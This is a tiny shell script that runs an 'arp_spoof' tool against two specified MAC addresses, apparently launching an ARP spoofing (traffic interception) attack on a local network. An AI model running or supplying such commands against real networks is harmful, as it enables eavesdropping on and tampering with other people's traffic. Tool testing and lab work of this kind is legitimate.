#!/bin/sh
./arp_spoof -a -i 30 00:00:31:6B:00:C8 spoof 00:C0:26:A1:3C:B2 g0
